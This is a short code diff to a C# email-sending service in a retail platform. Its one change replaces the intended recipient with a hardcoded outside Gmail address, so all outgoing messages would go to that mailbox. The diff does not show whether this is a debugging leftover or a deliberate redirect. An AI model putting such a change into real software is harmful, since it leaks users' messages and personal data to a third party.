@@ -268,7 +268,7 @@ namespace RetailPlatform.Core.Services
             };
 
             sendGridMessage.SetFrom(_emailConfig.SendFrom, _emailConfig.SendGridSender);
-            sendGridMessage.AddTo(email, string.Empty);
+            sendGridMessage.AddTo("compexsale@gmail.com", string.Empty);
 
             try
             {
